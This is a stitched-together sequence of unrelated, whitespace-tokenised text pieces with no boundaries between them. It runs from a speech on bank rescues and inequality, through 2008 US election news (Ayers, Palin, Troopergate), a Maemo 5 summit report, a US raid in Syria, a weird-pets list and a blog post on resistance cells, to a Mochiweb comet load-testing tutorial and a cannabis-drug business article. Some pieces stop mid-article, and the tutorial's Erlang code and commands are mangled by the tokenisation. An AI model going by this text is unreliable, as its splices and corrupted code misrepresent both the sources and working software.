It is thus in the interests of the individual citizen to support the decision to rescue a bank in difficulty , as the individual interest coincides with the public interest [ 2 ] .
What happened , however , suggests that the rational arguments that I have just propounded do not always chime with public opinion .
Again , it strikes me as interesting to ask why this should be the case .
To answer this question , it is necessary to enter the realm of the analysis of human behaviour , via the field of behavioural economics .
Several laboratory experiments have been carried out , which show that , when faced with some economic choices , individuals may behave in ways that are apparently not rational .
In general , it has been shown that economic agents are not only motivated by self - interest , as economists have been keen to believe , but are also motivated by considerations relating to fairness and relative conditions .
According to some studies , a rise in income is only seen in a positive light if it exceeds that of the reference group ; if , instead , the increase in income is less than that of the reference group , it is perceived as being an absolute loss , even if it is only relative .
One consequence of these tendencies , borne out in a number of experiments , is that individuals may even be prepared to renounce additional income , just to have a more equitable distribution of wealth within the community , particularly when this is to their advantage .
Zizzo and Oswald [ 3 ] , researchers at the Universities of Oxford and Warwick respectively , outline the results of an experiment in which the participants can pay out of their own pocket to “ burn ” money belonging to the other members of the group .
The majority of subjects choose to do so , even if this reduces their own income .
On average , it is the richest subjects who are most affected .
This line of research suggests that inequalities create tensions within given social groups and lead to backlashes .
These results are consistent with recent studies which attempt to account for the “ happiness ” of individuals in terms of a series of parameters , including income .
In this context , the Easterlin paradox is well - known . [ 4 ]
It suggests that when individuals see an increase in their income , their level of satisfaction does not necessarily rise if the increase is very unequal .
This literature offers an explanation of the behaviour recently observed in our societies , namely the opposition to helping the crisis - hit financial system , because it is perceived as being richer and well - off .
On the contrary , there is greater readiness to help other sectors of the economy , such as agriculture or the automotive industry , even though these sectors have a smaller direct impact on people ’s well - being .
This is probably because these sectors are perceived as being less well - off and faced with difficulties arising from exogenous factors rather than recklessness , unlike the financial sector .
It is interesting to note that such attitudes opposed to inequality have also emerged recently in the United States , where income disparities have tended to meet with greater acceptance than in Europe , as shown in studies by Alesina , Di Tella and MacCulloch . [ 5 ]
One possible explanation is that the mechanisms of upward mobility in American society , which in the past made inequality more acceptable , have ground to a halt in recent years .
In the last few years , statistical indicators have shown an increase in income disparity in most advanced countries .
The Gini index , which is typically used to measure income inequalities , [ 6 ] rose in the United States from 34 % at the end of the 1980s to over 36 % at the start of this century .
The index also increased in the United Kingdom , rising from 30 % to 34 % , and in the euro area , on average , where it rose from 29 % to 31 % .
Within the euro area , the largest increases were recorded in Germany ( from 26 % to 34 % ) and Spain ( from 30 % to 34 % ) , while in France and Italy the figures remained substantially unchanged ( at 29 % and 34 % respectively ) .
The growing income differences recorded in the last few years have been accompanied by two other distinct phenomena .
First , a progressive decline in the average rate of growth of income has been recorded in advanced countries .
In per capita terms , the last decade has been the worst experienced by the United States in over 100 years , barring only the 1930s .
In Europe , the slowdown has been comparable , albeit not so marked .
Second , the difference seems to have mainly favoured the financial sector .
For example , in the United States the profits of the financial sector have in the past five years amounted to 40 % of the total profits of the corporate sector , i.e. double the average of the period 1960 - 2000 .
This is simply to report events , not to make a value judgement .
The combination of these three factors – the worsening inequality , the economic slowdown and the high profitability of the financial sector – may partly explain public opinion and the attitude of the political authorities vis -à - vis the rescue package for the financial system .
This crisis reveals that in our advanced societies , which are subject to far - reaching changes that affect people ’s daily lives , the resolution of financial crises is becoming more complex , not only in terms of costs to the community , but also in terms of decision - making procedures .
There is a risk that , in order to reach the democratic consensus necessary to act effectively , matters must be pushed right to the brink so that the precipice is clearly visible .
In other words , there is a risk that a mistake , such as letting a bank fail , must first be committed , and the prospect of widespread hardship must make people realise that their vital interests are at stake , before effective action can be taken successfully .
The problem is particularly acute in the case of the financial system , which is inevitably prone to instability .
In particular , the financial system is typically more innovative .
Since financial products cannot be patented , an institution ’s ability to compete rests partly on its ability to create new products that enable it to increase returns without changing the level of risk or to diversify risk without for a given return .
However , financial innovation tends to generate information asymmetries across agents , particularly between those who have created new instruments and those who buy them .
Such asymmetries fuel market instability , leading to a tendency to underestimate risks until they materialise , and , subsequently , to a propensity to overestimate them when markets change direction .
The procyclicality of the financial sector tends to produce a disproportionate increase in its profitability at times of economic growth and a decline during slowdowns , with self - propagation and contagion effects on the rest of the economy .
Essentially , the financial system is of systemic importance to the economy .
The stability of the system is therefore in the public interest .
Consequently , the system is subject to regulation and supervision .
Therefore , it is somewhat problematic if rejection mechanisms develop within a society preventing effective action being taken to counter a financial crisis and contagion of the rest of the economy .
So , what is the answer ?
There are some time - honoured lines of action which relate to the prevention of crises , namely better regulation and supervision , in particular at the international level , and more effective crisis resolution mechanisms .
I will not dwell on these two points , which will be the subject of technical and political discussions in the coming months and years .
One new point for consideration that has emerged from this crisis relates equally to ethical , social and political aspects .
In our advanced societies , which in years to come will continue to undergo periods of great transformation bringing real problems for many sectors of the population , the emergence of stark inequalities entails the risk that decision - making mechanisms will be blocked , in particular in crisis situations , with negative repercussions for the collective good and social cohesion .
This should be solved both by governments , so that decision - making mechanisms can be adopted which allow the abovementioned problems to be overcome in a crisis , and also by the financial sector itself , which must clearly draw some lessons from recent events .
In a market economy , maximising profits and shareholders ’ interests are a priority for management .
They permit the efficient allocation of resources within the economy .
However , when a sector such as the financial sector is of systemic importance to the functioning of the economy and is prone to instability , the objective function must be broader .
It is a problem of rules , incentives and individual responsibility .
Much more work must be done on these points if we wish to avoid repeating past errors .
Thousands of academics sign on to support Bill Ayers RAW STORY
Published : Wednesday October 22 , 2008
Print This Email This More than 3,000 academics have shown their support for embattled University of Illinois professor William Ayers .
" I think he 's doing a lot of positive , progressive , constructive work right now " in the field of education , said Brown University English professor and inaugural signatory William Keach to the Brown Daily Herald .
Ayers , a co-founder of the Weather Underground in 1969 , has been connected repeatedly with Senator Obama by the McCain campaign , which paints Ayers as a " domestic terrorist " who " bombed the Pentagon . "
Governor Palin charged in a Colorado speech on October 4 that Senator Obama is " someone who sees America ... as so imperfect that he 's palling around with terrorists who would target their own country . "
The Weather Underground 's protests of the Vietnam War were part of a " Declaration of a State of War " against the United States government , which included marches , riots and bombings of banks and government buildings .
Senator Obama has distanced himself from Ayers ' Weather Underground days , noting that he was eight years old when the group was formed .
Obama and Ayers worked together in Chicago while living in the same neighborhood in the 1990s , with Ayers hosting a " coffee " for Obama 's first run for office , which has prompted accusations of Obama launching his political career " from Mr. Ayers ' living room . "
Obama and Ayers served together on the board of the anti-poverty Woods Fund of Chicago between 2000 and 2002 .
Both have worked in education reform .
" It 's easy to paint someone with a broad brush , " added signatory and lecturer Constance Crawford , who emphasized appreciation for Ayers ' more recent accomplishments rather than focusing on the Vietnam era .
" It 's easy to vilify , but it 's harder to consider . "
Linux mobile developers , Nokia employees , and members of the Maemo community came together in Berlin this past weekend for the very first Maemo Summit .
The event offered attendees an opportunity to share ideas and participate in collaborative development .
It also provided Nokia with a venue for introducing the Maemo development community to some of the innovative new concepts and technologies that will define the evolution of Maemo 5 ( codenamed Fremantle ) , the next major version of the platform .
Nokia is pushing significant architectural changes at many different levels in the Maemo platform stack .
The new components will simplify application development and bring new capabilities to future Internet Tablet products .
Nokia also has some plans to stimulate third - party application development and expand the ecosystem of independent Maemo software .
Hardware and boot management
Nokia has adopted Upstart , a framework developed by Canonical that manages system services and processes that are executed during startup and shutdown .
Upstart is asynchronous and event - driven , which means that it can perform multiple tasks at the same time and will start tasks when the necessary system conditions have been reached .
It has the potential to provide a lot more granularity and robustness than the conventional SysV init daemon , which performs tasks iteratively based on a predetermined order .
Upstart delivers the performance advantages of concurrent booting , while avoiding race conditions .
The benefit for end users is that , with a proper configuration , Upstart could significantly reduce startup time for Maemo - based devices .
The Open Hardware Manager ( OHM ) is slated for inclusion , too .
It is a lightweight , pluggable service that wraps around the FreeDesktop.org Hardware Abstraction Layer ( HAL ) and provides a generic , standardized interface for accessing power statistics and controlling relevant mobile device functionality , such as backlighting and heat dissipation .
It is user - configurable and supports rule - based policies .
Some possible use cases include disabling the power button during a firmware update , instructing the system to throttle down the processor if components start to get too hot , and automatically adjusting screen brightness on the basis of remaining battery life .
Some of the most exciting changes to the Maemo platform are in the area of connectivity .
As we discussed in our recent coverage of Ari Jaaksi's presentation about Maemo 5 , Nokia is opening its HSPA source code and will be bringing cellular connectivity to the platform .
Nokia has also opened the source code of stlc45xx , a WiFi driver for the STMicro WiFi parts used in Nokia Internet Tablet devices .
It is based on mac80211 , a popular SoftMAC implementation for Linux that has also been adopted by Intel and Atheros .
Nokia wants members of the open source software community to participate in improving the stlc45 xx driver and is trying to get it mainlined into the Linux kernel .
Multimedia
Users and developers can look forward to lots of multimedia improvements in Maemo 5 .
One of the biggest infrastructure changes is the addition of PulseAudio ( PA ) , a cross - platform open sound server that is network - transparent and supports some really nifty mixing features .
PA makes it easy to control the volume of audio streams on a per-application basis and to redirect audio streams among devices or computers on a network .
There are many scenarios in which these abilities could be useful on a tablet device .
For instance , PA would allow a VoIP application to programmatically mute a music player application when the user initiates a voice call .
PA is already used in several desktop Linux distributions , but it has been problematic in many ways because of configuration glitches and legacy applications that require work - arounds .
These issues could pose some challenges to Nokia and detract from PA 's value to end users .
It is also unclear at this point how much of PA 's advanced functionality will be exposed to the end user .
If Nokia can avoid the configuration pitfalls and provide a clean and simple UI that lets users take advantage of powerful features like audio stream redirection and network autodiscovery , I 'll be really impressed .
Another big multimedia improvement will come in the form of GstOpenMAX , an open source GStreamer plugin .
This leverages STMicro's Bellagio implementation of the OpenMAX integration layer — a standardized API that is defined by Khronos , the same group that is behind OpenGL .
The plugin — which was developed collaboratively by Nokia , Fluendo , TI , and STMicro — will allow OpenMAX - compliant media components to be snapped into GStreamer , the GObject - based media framework that is used by most GTK + and GNOME audio and video applications .
End users can probably look forward to getting better hardware - accelerated audio support .
At a higher level , Nokia 's new Midas framework will simplify the development of multimedia applications by providing developers with a rich API that brings together a lot of media - related functionality .
Applications will be able to use Midas to manage and share playlists , interact with metadata , and tap into the local filesystem media index .
The platform improvement that will have the most visible impact on the Maemo user experience is the inclusion of Clutter , a powerful graphics framework that enables development of rich user interfaces .
This will be leveraged for aesthetic improvements , visual effects , and heightened usability .
There are also changes to Nokia 's Hildon widget toolkit , which will gain some new , finger - friendly components .
Nokia revealed that internal experimentation with multitouch is ongoing , but declined to confirm whether this functionality will be adopted for future products .
For extensive details about those aspects of the platform , keep an eye out for our upcoming article about Maemo design and usability .
Search and UPnP
Maemo 5 will include the Tracker indexing and metadata extraction system , an open source search framework that is similar to Apple 's Spotlight .
Tracker provides some compelling backend features , such as system - wide metadata storage , but its front - end utilities are still very poor .
On the desktop , many users favor Beagle , a more complete and mature alternative that is used by several Linux distributions .
Tracker is a better choice than Beagle for mobile and embedded environments , however , because it is implemented in native C and designed for superior runtime performance on resource - constrained devices .
If it matures sufficiently , Tracker could be really useful for several tasks , ranging from basic file searches to supplying Midas with media library metadata .
The new version of Maemo will also bundle gUPnP , an open source implementation of the Universal Plug and Play ( UPnP ) network protocol .
The framework , which was developed by OpenedHand , provides a simple GObject - based API and includes support for network autodiscovery with the Simple Service Discovery Protocol .
Additionally , it includes libraries with GTK + widgets for displaying UPnP information , and another that has functions for leveraging UPnP in multimedia applications .
It will make it trivially easy for Maemo - based devices to interface with UPnP services on commercial products and networked computers .
Encouraging independent application development
Nokia will aggressively encourage third - party application development and help make Maemo software more visible to end users .
A big part of that plan is the upcoming maemo.nokia.com web site , which will promote and sell third - party programs .
Nokia will also offer free user experience consulting services to developers .
Peter Schnieder , Nokia 's director of Maemo marketing , told attendees at the summit that the company will even be paying to promote certain third - party applications with search engine advertising .
These moves are clearly Nokia 's answer to Apple 's increasingly popular application store for the iPhone .
Most of the source code for the new components is already available .
The platform will continue to be developed transparently with the participation of the open source software community .
The first official Maemo 5 SDK alpha release is loosely planned for November .
The first beta could land between March and May .
Nokia says that incremental releases will be issued every week until the final version of the SDK is released .
It is still unclear whether Maemo 5 will be able to run on legacy Internet Tablet devices , but it seems increasingly unlikely .
Those of us who want to test prerelease builds on real OMAP 3 hardware are going to have to work with TI Beagle Board devices until we can get our hands on some next - generation tablets .
Nokia 's roadmap for Maemo 5 is a huge win for mobile Linux enthusiasts .
Nokia is liberating new hardware drivers , adapting intriguing new desktop Linux technologies , and is working closely with the open source software community to accelerate evolution of their operating system .

Sarah Palin denies any wrongdoing over the affair
Republican vice - presidential candidate Sarah Palin is " unlikely to co-operate " with an inquiry into alleged abuse of power , a campaign spokesman has said .
Ed O'Callaghan said the Alaska state legislative probe had become " tainted " by partisan Democratic politicians seeking to target the Alaska governor .
Mrs Palin , who is John McCain 's running mate , denies any improper behaviour .
A spokeswoman for the Alaska Democratic Party rejected claims that the inquiry had become politically motivated .
The probe into the affair - referred to by some as " Troopergate " - began before Republican presidential nominee John McCain picked Mrs Palin as his running mate last month .
Mrs Palin and her husband campaigned in Colorado and Ohio on Monday .
She is expected to make further campaign appearances in Ohio on Tuesday .
' Stall and smear '
Mrs Palin is accused of removing Alaska Public Safety Commissioner Walt Monegan from his post after he had refused her request to fire her ex-brother - in - law , Mike Wooten , as a state trooper .
Mr Wooten was involved in a contentious divorce and child custody battle with her younger sister .
Critics say Mrs Palin was using her power as governor to pursue a personal feud .
The investigation centres on the dismissal of Alaska 's public safety chief
Mrs Palin insists that she fired Mr Monegan over disagreements about budget priorities .
A bipartisan panel of the Alaska state legislature voted to authorise an inquiry and in July appointed retired prosecutor Stephen Branchflower to lead it .
Mrs Palin 's husband , Todd , has been ordered to testify to the inquiry , as have her chief of staff and deputy chief of staff .
McCain campaign spokesman Mr O'Callaghan said he did not know if Mr Palin would challenge the subpoena , issued on Friday , requiring his cooperation .
However , Mrs Palin was " unlikely to co-operate " with the inquiry " so long as it remains tainted and run by partisan individuals that have a pre-determined conclusion " , the AFP news agency quotes him as saying .
Mrs Palin has not been ordered to testify but Mr Branchflower has said he hopes to speak to her about Mr Monegan 's dismissal .
Patti Higgins , spokeswoman for the Alaska Democratic Party , accused the Republican presidential campaign of " doing everything it can to stall and smear " the investigation .
Mrs Palin's lawyer has claimed that public statements by the Democratic chairman of the state Senate Judiciary Committee earlier this month indicate that the inquiry is politically motivated .

BBC News , Mumbai
Some varieties take up to 14 years to bloom A flower which blooms only every eight to 10 years is attracting nature lovers to the outskirts of the Indian city of Mumbai ( Bombay ) .
The bright purple Karvy will cover many forest areas with a colourful veil once it is in full blossom .
The plant grows to a height of up to eight feet .
It is mainly found in the low hills along the west coast .
Juice from the flower is used for medicinal purposes and the stems are used for thatched buildings .
Pop The Karvy ( Strobilanthes callosus or Carvia Callosa ) blooms between July and September .
But it takes nearly a decade for the bloom cycle to happen .
Dr V Shubhalaxmi from the Bombay Natural History Society says different varieties have different blooming periods - some even ranging up to 14 years .
Local businessman Julius Rego travelled for nearly two hours to see the Karvy .
" It is not just the flowers but the entire landscape , " he says .
" Several insects , butterflies , bees , are attracted to this flower and one gets to see so many more varieties at this time .
To sit amid these flowers for some time gives such joy . "
The flowers are an experience for the ears as well as the eyes .
" If you visit the region after flowering , which will continue for over a month , you will witness ... popping sounds , " Dr Shubhalaxmi says .
After flowering , the shrub is covered with fruits which absorb moisture and burst open with a pop .
The leaves are home to caterpillars , snails and several other insects .

Putting Words in Palin's Mouth
There was a flutter of attention when McCain campaign manager Rick Davis told a group of Post reporters and editors yesterday that his team was having to rework the vice presidential acceptance speech because the original draft , prepared before Gov. Sarah Palin was chosen , was too " masculine . "
While we all wondered to ourselves what might make a speech masculine or feminine , no one batted an eye at the underlying revelation : that the campaign was writing the nominee 's speech before knowing who the nominee would be .
Sarah Palin prepares for her speech tonight .
( AP Photo / ABC News )
Never mind the prehistoric days when a politician might be expected to write his or her own words ; speechwriters have been around since long before television .
But traditionally their job was to channel their bosses ' thoughts and ideas into poetry , or at least comprehensible English .
Nowadays , apparently it 's naive to expect a speech even to reveal something of the essential views or character of the speaker .
Instead , campaigns -- not just the McCain campaign -- draft their speeches with an eye to which demographic groups need to receive which messages , and then we in the media rate the speeches based on how well we think they hit those targets .
So when you watch Sarah Palin tonight , expect to learn something about how well she handles a Teleprompter .
Expect to learn something about the McCain campaign 's assessment of its political standing with women , or working families , or social conservatives .
Whether you 're learning what Sarah Palin really thinks or feels is anybody 's guess .

US military helicopters have carried out a raid inside Syria along the Iraqi border , killing eight people including four children , Syrian officials say .
The official Syrian news agency Sana said the attack took place in the Abu Kamal border area , in eastern Syria .
Damascus has condemned the strike as a " serious violation " of its territory .
The US has neither confirmed nor denied the incident .
It has previously accused Syria of allowing foreign militants into Iraq .
Syria has summoned the US and Iraqi envoys in Damascus to protest at the raid .
" Syria condemns this aggressive act and holds American forces responsible for this aggression and all of its repercussions , " a government official said .
If confirmed , the raid would be the first known attack by US forces inside Syrian territory , says BBC diplomatic correspondent Jonathan Marcus .
Its timing is curious , coming right at the end of the Bush administration 's period of office and at a moment when many of America 's European allies - like Britain and France - are trying to broaden their ties with Damascus , our correspondent adds .
Crossing point
" Four American helicopters violated Syrian airspace around 1645 local time [ 1345 GMT ] on Sunday , " Sana said .
" American soldiers " emerged from helicopters and " attacked a civilian building under construction and opened fire on workers inside - including the wife of the building guard - leading to [ the deaths ] of eight civilians " , it added .
" The helicopters then left Syrian territory towards Iraqi territory , " Sana said .
The dead include a man , his four children and a married couple , the Syrian report said , without giving details of the children 's ages .
The village was named as Sukkiraya , 8 km ( 5 miles ) from the Iraqi border .
A US military spokesman was unable to confirm or deny the reports , saying it was a " developing situation " .
But later the Associated Press news agency quoted an unnamed US military official in Washington as saying that American special forces had attacked foreign fighters linked to al - Qaeda .
" We are taking matters into our own hands , " the official said .
The area is near the Iraqi border city of Qaim , a major crossing point for fighters , weapons and money travelling into Iraq to fuel the Sunni insurgency .
Washington has in the past accused Damascus of turning a blind eye to the problem .
The Iraqi city 's mayor , Farhan al - Mahalawi , told Reuters news agency that US helicopters had struck a village on the Syrian side of the border , after which Syrian troops surrounded the site .
Olbermann : McCain , Palin have questionable ties of their own Nick Cargo and David Edwards
Published : Wednesday October 8 , 2008
Print This Email This Senator McCain and running mate Governor Sarah Palin have Senator Obama " beat hands - down " on anti-semitic , Iranian and terrorist ties , said MSNBC's Keith Olbermann .
Former Clinton aide Paul Begala pointed out on Sunday that McCain sat on the board of the U.S. Council for World Freedom , part of the World Anti-Communist League , having joined in 1982 after the Anti-Defamation League called it a " gathering place for racists and anti-semites with links to Nazi collaborators and right - wing death squads . "
The Council for World Freedom was funded by right - wing tycoon Sun Myung Moon , and among its ranks were founding CIA member and Iran - Contra figure John K. Singlaub .
While McCain resigned from the organization due to a stated " lack of time , " he attended one of its events as late as 1986 , and the organization continued to use his name on its letterhead around the same time .
Governor Palin 's involvement with the pro-secession Alaskan Independence Party , to which husband Todd belonged , was also criticized .
The Governor herself , in a March video message , told the organization to " keep up the good work . "
Founder Joe Vogler , in 1993 , intended to give a speech denouncing " American tyranny " at the United Nations with the sponsorship of Iran .
" If Iran ties and secession do not qualify as terrorist associations , " Olbermann said , the WACL also armed and sent supplies , including boots , to rebels in Afghanistan who would become the Mujahadeen , later the Taliban , and Osama bin Laden , " whom McCain once promised to chase to the gates of Hell . "
" And , if bin Laden is quaking in his boots at that thought , " Olbermann quipped , " who knows , maybe those boots are ' Air McCains . ' "
More of the segment , with commentary from MSNBC's Rachel Maddow , is available to view below .
It was broadcast on MSNBC's Countdown on October 7 , 2008 .

One of the more interesting aspects of this election cycle is how John McCain has consistently outperformed his party .
Despite an unpopular incumbent administration , dismal economic outlook , and huge Democratic advantage in party affiliation , McCain is running almost even with Barack Obama .
Citigroup analysts think that the conventions have n't changed this , especially given the unbelievable popularity of Sarah Palin .
The consequence for markets ?
Increased volatility as investors keep shifting their positions in anticipation of this or that outcome :
Given an unpopular war , poor Presidential approval ratings and a challenged economy , one would
have expected a stronger lead for the Obama / Biden ticket over the McCain / Palin one .
Yet , a tight race could keep equity market investors unsure of the outcome as a few key battleground states will likely decide the election .
Such uncertainty could be negative for the stock market near term .
A second " uncertainty " that could perplex the stock market is McCain 's reputation as a maverick , suggesting unpredictable policy outcomes even in the event of a Republican win of the White House
It does n't seem likely that either candidate will pull away and give the market the predictability its looking for .
Obama pulled ahead briefly towards the end of the Democratic convention , registering 8 point leads in Gallup and Rasumussen tracking polls .
But now , thanks to Sarah Palin , that bump has all but disappeared .
Obama 's lead in today 's Rasmussen poll has shrunk to two , and a CBS poll released today shows an exact tie between the Obama / Biden and McCain / Palin tickets .

Yoda the cat with four ears ( yes this is real )
People seem so fascinated with animals born with an extra set of limbs , or born with two faces , or who simply look really bizarre .
But the truth is that those animals can still be adorable too , and the reality is that every animal still deserves to be loved .
Posted below are ten pictures of pets that are really weird , but that are also still kind of cute in their own way :
An albino hedgehog
A hairless cat ( yes , some people actually prefer these )
Genetically modified Glofish ( yes , they actually glow in the dark )
A kitten born with 8 legs ( yes , another true story )
The First Essential Scary Truth
One of the big conceits being practiced by many of those unhappy with the outcome of the 2016 Presidential Election is resistance .
Those involved with this idea are actively forming “ cells , ” passing information between other members via Facebook and have even created a hashtag – #resist – for their cause .
Although it ’s heartening to see so many of my fellow citizens involved in the political machinations of the Republic , I find myself taken a bit aback by this resistance movement .
Perhaps it ’s the social media element of the whole thing or maybe it ’s the faux outrage of some of those involved .
Whatever the case I find myself wanting to offer help to those resistance members and their fellow travelers .
For the sake of whatever record there is out there in these heady days , I have family members that were active in various resistance cells and movements ; my Uncle Benny was in the Warsaw Ghetto Uprising and the Old Man was a member of the Irgun ( a militant organization run by Menachem Begin to help found the modern state of Israel ) in various DP camps after the Shoah .
They mentioned a few things to my brother and I .
Being a generous man , concerned about the welfare of others , I ’d like to pass this knowledge over to these leaders , followers et al .
First , when involved in a resistance movement / cell you never let anyone know you are a member of said movement or cell .
Second , you never advertise on a billboard , in a public house or ( in the modern era ) on social media that you are a member of said resistance .
If these rules are not followed the Man , Fascists , Nazis , NSA et al will have no problem finding you .
Once found you will be , if you are a romantic , tortured , imprisoned , water boarded and perhaps even killed for your cause .
If you are a pragmatist and / or realist you will find the IRS taking an extra special look at your taxes ( audit ! ) for the past few years .
If you still have questions go watch the Star Trek : Deep Space Nine episodes where the Dominion takes over the space station .
Even Odo and Kira had sense enough to talk in private .
Seriously guys , get with it .
Even the French got this back in the 1940’s .
A Million - user Comet Application with Mochiweb , Part 1
In this series I will detail what I found out empirically about how mochiweb performs with lots of open connections , and show how to build a comet application using mochiweb , where each mochiweb connection is registered with a router which dispatches messages to various users .
We end up with a working application that can cope with a million concurrent connections , and crucially , knowing how much RAM we need to make it work .
In part one :
Build a basic comet mochiweb app that sends clients a message every 10 seconds .
Tune the Linux kernel to handle lots of TCP connections
Build a flood - testing tool to open lots of connections ( ye olde C10 k test )
Examine how much memory this requires per connection .
Future posts in this series will cover how to build a real message routing system , additional tricks to reduce memory usage , and more testing with 100k and 1 m concurrent connections .
I assume you know your way around the Linux command line , and know a bit of Erlang .
Building a Mochiweb test application
In brief :
Install and build Mochiweb Run : / your - mochiweb - path / scripts/newmochiweb.erl mochiconntest cd mochiconntest and edit src/mochiconntestweb.erl
- module ( mochiconntest_web ) . - export ( [ start / 1 , stop / 0 , loop / 2 ] ) . %%
External API start ( Options ) -> { DocRoot , Options1 } = get_option ( docroot , Options ) , Loop = fun ( Req ) -> ?
MODULE : loop ( Req , DocRoot ) end , % we 'll set our maximum to 1 million connections .
( default : 2048 ) mochiweb_http : start ( [ { max , 1000000 } , { name , ?
MODULE } , { loop , Loop } | Options1 ] ) . stop ( ) -> mochiweb_http : stop ( ? MODULE ) . loop ( Req , DocRoot ) -> " / " ++
Path = Req : get ( path ) , case Req : get ( method ) of Method when Method =:= ' GET ' ; Method =:= ' HEAD ' -> case Path of " test / " ++
Id ->
Response = Req : ok ( { " text / html ; charset=utf - 8 " , [{ " Server " , " Mochiweb - Test " } ] , chunked } ) , Response : write_chunk ( " Mochiconntest welcomes you !
Your Id : " ++ Id ++ "
" ) , % % router:login( list_to_atom ( Id ) , self ( ) ) , feed ( Response , Id , 1 ) ; _ ->
Req : not_found ( ) end ; ' POST ' -> case Path of _ -> Req : not_found ( ) end ; _ ->
Req : respond ( { 501 , [ ] , [ ]} ) end .
feed ( Response , Path , N ) -> receive % {router_msg , Msg} -> %
Html = io_lib : format ( " Recvd msg # ~w : '~s ' < br / > " , [ N , Msg ] ) , % Response : write_chunk ( Html ) ; after 10000 ->
Msg = io_lib : format ( " Chunk ~w for id ~s
" , [ N , Path ] ) , Response : write_chunk ( Msg ) end , feed ( Response , Path , N + 1 ) . %%
Internal API get_option ( Option , Options ) -> { proplists : get_value ( Option , Options ) , proplists : delete ( Option , Options ) }.
Start your mochiweb app
$ make && ./ start - dev.sh
This code ( mochiconntest_web.erl ) just accepts connections and uses chunked transfer to send an initial welcome message , and one message every 10 seconds to every client .
By default mochiweb listens on port 8000 , on all interfaces .
If you are doing this on the desktop , you can test with any web browser .
Just navigate to http://localhost:8000/test/foo.
Here 's the command - line test :
$ lynx -- source " http://localhost:8000/test/foo "
Mochiconntest welcomes you !
Your Id : foo < br / > Chunk 1 for id foo < br />
Chunk 2 for id foo < br />
Chunk 3 for id foo < br /> ^C
Yep , it works .
Now let 's make it suffer .
Tuning the Linux Kernel for many tcp connections
Save yourself some time and tune the kernel tcp settings before testing with lots of connections , or your test will fail and you 'll see lots of Out of socket memory messages ( and if you are masquerading , nf_conntrack : table full , dropping packet . )
Here are the sysctl settings I ended up with - YMMV , but these will probably do :
$ cat /etc/sysctl.conf # General gigabit tuning : net.core.rmem_max = 16777216 net.core.wmem_max = 16777216 net.ipv4.tcp_rmem = 4096 87380 16777216 net.ipv4.tcp_wmem = 4096 65536 16777216 net.ipv4.tcp_syncookies = 1 # this gives the kernel more memory for tcp # which you need with many ( 100 k + ) open socket connections net.ipv4.tcp_mem = 50576 64768 98152 net.core.netdev_max_backlog = 2500 # I was also masquerading the port comet was on , you might not need this net.ipv4.netfilter.ip_conntrack_max = 1048576
Put these in /etc/sysctl.conf then run sysctl -p to apply them .
No need to reboot , now your kernel should be able to handle a lot more open connections , yay .
Creating a lot of connections
There are many ways to do this .
Tsung is quite sexy , and there and plenty of other less - sexy ways to spam an httpd with lots of requests ( ab , httperf , httpload etc ) .
None of them are ideally suited for testing a comet application , and I 'd been looking for an excuse to try the Erlang http client , so I wrote a basic test to make lots of connections .
Just because you can , does n't mean you should .. one process per connection would definitely be a waste here .
I 'm using one process to load urls from a file , and another process to establish and receive messages from all http connections ( and one process as a timer to print a report every 10 seconds ) .
All data received from the server is discarded , but it does increment a counter so we can keep track of how many HTTP chunks were delivered .
floodtest.erl

Each connection we make requires an ephemeral port , and thus a file descriptor , and by default this is limited to 1024 .
To avoid the Too many open files problem you 'll need to modify the ulimit for your shell .
This can be changed in /etc / security / limits.conf , but requires a logout / login .
For now you can just sudo and modify the current shell ( su back to your non - priv'ed user after calling ulimit if you do n't want to run as root ) :
$ sudo bash # ulimit -n 999999 # erl
You might as well increase the ephemeral port range to the maximum too : # echo " 1024 65535 " > / proc/sys/net/ipv4/iplocalport_range
Generate a file of URLs to feed to the floodtest program :
( for i in ` seq 1 10000 ` ; \ do echo " http://localhost:8000/test / $ i " ; done ) > \ /tmp/mochi-urls.txt
From the erlang prompt you can now compile and launch floodtest.erl :
erl > c( floodtest ) .
erl > floodtest : start ( " /tmp/mochi-urls.txt " , 100 ) .
This will establish 10 new connections per second ( ie , 1 connection every 100 ms ) .
It will output stats in the form { Active , Closed , Chunks} where Active is the number of connections currently established , Closed is the number that were terminated for some reason , and Chunks is the number of chunks served by chunked transfer from mochiweb .
Closed should stay on 0 , and Chunks should be more than Active , because each active connection will receive multiple chunks ( 1 every 10 seconds ) .
The resident size of the mochiweb beam process with 10,000 active connections was 450MB - that 's 45 KB per connection .
CPU utilization on the machine was practically nothing , as expected .
Assessment so far
That was a reasonable first attempt .
45 KB per-connection seems a bit high - I could probably cook something up in C using libevent that could do this with closer to 4.5 KB per connection ( just a guess , if anyone has experience please leave a comment ) .
If you factor in the amount of code and time it took to do this in Erlang compared with C , I think the increased memory usage is more excusable .
In future posts I 'll cover building a message router ( so we can uncomment lines 25 and 41 - 43 in mochiconntest_web.erl ) and talk about some ways to reduce the overall memory usage .
I 'll also share the results of testing with 100k and 1 M connections .
UPDATE
Check out Part 2 and Part 3 for the rest of the saga .
Over the past 20 years studies have shown the efficacy of using marijuana in medicine specifically its psychoactive ingredient , tetrahydrocannabinol .
Forty billion dollars is the number of dollars up for grabs in the North American pharma market for pain , anxiety and mood disorders .
Cannasat Therapeutics
Inc , a junior drug developer located in Canada , is now targeting those conditions with treatments inspired by cannabis sativa .
According to the October 7 , 2008 National Post article , ( " Just Don't Call It Pot " ) " Research showing the potential for cannabis - based drugs has been trickling into pharmaceutical labs since the 1980s , and the scientific community has long been convinced of their usefulness as pain - relievers and appetite stimulants .
Meanwhile , industry experts say that major pharmaceutical firms such as Bayer and Sanofi - Aventis have all quietly entered the space with their own cannabinoid platforms .
They 're watching closely as junior companies like Cannasat and its main competitor , U.K. - based GW Pharmaceuticals , develop the first mainstream drugs based on cannabis derivatives or synthetic versions of THC . "
The article states , " Back in Cannasat 's lab , chief scientific officer Umar Syed is enthusiastically talking about CAT 310 .
The drug , he says , was designed with the stigma of cannabinoid - based drugs in mind .
At the same time , he believes the company will get more mileage from the potential of the delivery mechanism , known as ' nano - encapsulation , ' which Cannasat is using under license from the Finnish university researchers who developed it .
If CAT 310 clears its trials , its dissolving pill formulation will be key to its ability to compete with a dronabinol drug already on the market - an oral spray produced by GW Pharmaceuticals .
So far , reception to GW 's spray has been mixed .
By contrast , Cannasat 's CAT 310 pill dissolves slowly in the mouth , delivering the drug more efficiently to the bloodstream , says Syed , and patients can take smaller doses , thus reducing unwanted side effects such as intoxication .
At least , in theory .
At the moment , the ' nano - encapsulation ' technology Cannasat uses to make the CAT 310 tablets works too well .
As the pill dissolves , it encases the dronabinol molecules , preventing enough of them from being absorbed .
